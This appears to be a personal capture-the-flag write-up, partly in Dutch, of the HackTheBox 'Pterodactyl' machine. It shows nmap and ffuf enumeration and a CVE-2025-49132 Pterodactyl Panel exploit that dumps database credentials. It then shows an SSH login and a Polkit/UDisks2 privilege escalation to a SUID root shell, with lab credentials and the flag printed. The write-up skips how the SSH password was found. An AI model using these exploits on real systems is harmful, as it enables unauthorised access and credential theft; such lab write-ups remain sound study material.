# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Pterodactyl]
└─$ nmap 10.129.76.138                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:55 CET
Nmap scan report for pterodactyl.htb (10.129.76.138)
Host is up (0.042s latency).
Not shown: 981 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
8080/tcp closed http-proxy
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Pterodactyl]
└─$ nmap -p22,80,443,8080 -sCV 10.129.76.138      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:54 CET
Nmap scan report for pterodactyl.htb (10.129.76.138)
Host is up (0.29s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: My Minecraft Server
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy
```

Ik ben als eerst gaan kijken naar de verschillende pagina's. Maar Er is alleen op poort 80 iets gevonden. Ik ben door gebruik van het ffuf tool aan Directory enumeration gaan doen en hier heb ik de Public dir gevonden.

```
┌──(kali㉿kali)-[~/HTB/Pterodactyl]
└─$ ffuf -u http://pterodactyl.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  -ac     

Public                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 17ms]
:: Progress: [29999/29999] :: Job [1/1] :: 283 req/sec :: Duration: [0:00:29] :: Errors: 1 ::
```

Hierbij is er niets te vinden want het is forbidden. Ik heb ook gezien dat er op pagina een changelog bestand gevonden was. Ik heb gezien in de file dat er Pterodactyl Panel v1.11.10 draait met de volgende informatie: 
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

Ik ben dus nu gaan zoeken naar een vulnerability voor de panel met de versie en hierbij ben ik op het volgende gekomen. https://github.com/Zen-kun04/CVE-2025-49132 maar voor het moment loopt dit spoor ook vast. Ik ben eens gaan kijken of er een andere hosts gekent is en hierbij kan je zien dat een panel gekent is.

```
┌──(kali㉿kali)-[~/HTB/Pterodactyl/CVE-2025-49132]
└─$ ffuf -u http://play.pterodactyl.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.pterodactyl.htb" -ac 

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 1454ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1709 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

Ik ben deze gaan toevoegen aan de hosts file en daar kan je zien dat er een login page gekent is.

![[Pasted image 20260209102713.png]]

maar dit heeft me ook aan een dood spoor geleid. ik zal weer moeten gaan zoeken naar een andere exploit voor de panel versie. Hierop ben ik op de volgende exploit gekomen https://github.com/63square/CVE-2025-49132. Aan de hand van het exploit python script heb ik gezien dat de url exploitable is en door gebruik te maken van de dump_credentials script ben ik de volgende database en zijn credentials gaan dumpen.

```
┌──(kali㉿kali)-[~/HTB/Pterodactyl/CVE-2025-49132]
└─$ python3 exploit.py http://panel.pterodactyl.htb/     
/home/kali/HTB/Pterodactyl/CVE-2025-49132/exploit.py:16: SyntaxWarning: invalid escape sequence '\/'
  expected = '{"..\/..\/config\/prologue":{"alerts":{"levels":["info","warning","danger","success"],"session_key":"alert_messages"}}}'
Target is vulnerable!

┌──(kali㉿kali)-[~/HTB/Pterodactyl/CVE-2025-49132]
└─$ python3 dump-creds.py http://panel.pterodactyl.htb/                                                  
/home/kali/HTB/Pterodactyl/CVE-2025-49132/dump-creds.py:20: SyntaxWarning: invalid escape sequence '\/'
  expected = '{"..\/..\/config\/prologue":{"alerts":{"levels":["info","warning","danger","success"],"session_key":"alert_messages"}}}'
Target is vulnerable!
App key: base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=

-- Database config --
{'default': 'mysql', 'connections': {'mysql': {'driver': 'mysql', 'url': '', 'host': '127.0.0.1', 'port': '3306', 'database': 'panel', 'username': 'pterodactyl', 'password': 'PteraPanel', 'unix_socket': '', 'charset': 'utf8mb4', 'collation': 'utf8mb4_unicode_ci', 'prefix': '', 'prefix_indexes': '1', 'strict': '', 'timezone': '+00{{00}}', 'sslmode': 'prefer', 'options': {'1014': '1'}}}, 'migrations': 'migrations', 'redis': {'client': 'predis', 'options': {'cluster': 'redis', 'prefix': 'pterodactyl_database_'}, 'default': {'scheme': 'tcp', 'path': '/run/redis/redis.sock', 'host': '127.0.0.1', 'username': '', 'password': '', 'port': '6379', 'database': '0', 'context': []}, 'sessions': {'scheme': 'tcp', 'path': '/run/redis/redis.sock', 'host': '127.0.0.1', 'username': '', 'password': '', 'port': '6379', 'database': '1', 'context': []}}}

-- Filesystem config --
{'default': 'local', 'disks': {'local': {'driver': 'local', 'root': '/var/www/pterodactyl/storage/app', 'throw': ''}, 'public': {'driver': 'local', 'root': '/var/www/pterodactyl/storage/app/public', 'url': 'http://panel.pterodactyl.htb/storage', 'visibility': 'public', 'throw': ''}, 's3': {'driver': 's3', 'key': '', 'secret': '', 'region': '', 'bucket': '', 'url': '', 'endpoint': '', 'use_path_style_endpoint': '', 'throw': ''}}, 'links': {'/var/www/pterodactyl/public/storage': '/var/www/pterodactyl/storage/app/public'}}

-- Mail config --
{'default': 'smtp', 'mailers': {'smtp': {'transport': 'smtp', 'host': 'smtp.example.com', 'port': '25', 'encryption': 'tls', 'username': '', 'password': '', 'timeout': '', 'local_domain': 'panel.pterodactyl.htb'}, 'ses': {'transport': 'ses'}, 'mailgun': {'transport': 'mailgun'}, 'postmark': {'transport': 'postmark'}, 'sendmail': {'transport': 'sendmail', 'path': '/usr/sbin/sendmail -bs -i'}, 'log': {'transport': 'log', 'channel': ''}, 'array': {'transport': 'array'}, 'failover': {'transport': 'failover', 'mailers': ['smtp', 'log']}}, 'from': {'address': 'no-reply@example.com', 'name': 'Pterodactyl Panel'}, 'markdown': {'theme': 'default', 'paths': ['/var/www/pterodactyl/resources/views/vendor/mail']}}
```


IK MOET DE REVSHELL CONNECTIE MAKEN MET DE SERVER. DAAR ZAL IK EEN FILE VINDEN MET EEN HASH DIE IK MOET DECRYPTEREN

| Username     | Password |
| ------------ | -------- |
| phileasfogg3 | !QAZ2wsx |

Hiermee heb ik kunnen inloggen op de ssh server.

```
┌──(kali㉿kali)-[~/HTB/Pterodactyl]
└─$ ssh phileasfogg3@pterodactyl.htb             
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
Have a lot of fun...
Last login: Mon Feb  9 12:09:39 2026 from 10.10.16.154
Last login: Mon Feb 9 14:46:06 2026 from 10.10.16.154
phileasfogg3@pterodactyl:~>
```


```
[+] Step 1: Creating malicious XFS image with SUID bash...
300+0 records in
300+0 records out
314572800 bytes (315 MB, 300 MiB) copied, 0.59882 s, 525 MB/s
[sudo] password for kali: 
[+] Downloading bash from target...
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
bash                                                                              100%  989KB   3.0MB/s   00:00    
[+] Malicious XFS image created successfully

[+] Step 2: Uploading malicious XFS image to target...
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
xfs.image                                                                         100%  300MB   2.0MB/s   02:28    
[+] Image uploaded to /tmp/xfs.image on target

[+] Step 3: Executing Polkit bypass...
Pseudo-terminal will not be allocated because stdin is not a terminal.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Have a lot of fun...
Last login: Mon Feb 9 15:55:27 2026 from 10.10.16.154
Polkit bypass variables written to ~/.pam_environment
You will need to logout and login again for this to take effect

[!] IMPORTANT: You must logout and login again for Polkit bypass to work
[!] Run: ssh phileasfogg3@pterodactyl.htb
[!] Then re-run this script or execute the exploit manually

[+] Step 4: Executing UDisks2 race condition exploit...
./exploit.sh: line 101: warning: here-document at line 68 delimited by end-of-file (wanted `ENDSSH')
Pseudo-terminal will not be allocated because stdin is not a terminal.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Have a lot of fun...
Last login: Mon Feb 9 15:55:27 2026 from 10.10.16.154
[+] Killed gvfs-udisks2-volume-monitor
[+] Loop device created: /dev/loop0
[+] Started background watcher (PID: 5316)
[+] Triggering UDisks2 resize vulnerability...
[+] Caught SUID bash at /tmp/blockdev.BHBDK3/bash

```

```
phileasfogg3@pterodactyl:/tmp> ls
blockdev.BHBDK3                                                                 vmware-root_811-4290756501
root_out.txt                                                                    vmware-root_812-2957648972
systemd-private-6b598338b15847029114213150aa8c1e-chronyd.service-g96QTM         vmware-root_814-2966103502
systemd-private-6b598338b15847029114213150aa8c1e-nginx.service-2cvH93           vmware-root_818-2957124693
systemd-private-6b598338b15847029114213150aa8c1e-php-fpm.service-4XSOpn         vmware-root_819-4290101131
systemd-private-6b598338b15847029114213150aa8c1e-redis@redis.service-hbeamE     vmware-root_820-2956993618
systemd-private-6b598338b15847029114213150aa8c1e-systemd-logind.service-VkuRIS  vmware-root_821-4290232204
vmware-root_805-4257200540                                                      vmware-root_822-2965448144
vmware-root_807-4248746014                                                      vmware-root_834-2722239005
vmware-root_809-4282301975                                                      xfs.image
phileasfogg3@pterodactyl:/tmp> cat root_out.txt
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
b3ffb402faa0edb3c6f7f2b62c20e03d
phileasfogg3@pterodactyl:/tmp> 
```

![[Pasted image 20260209154127.png]]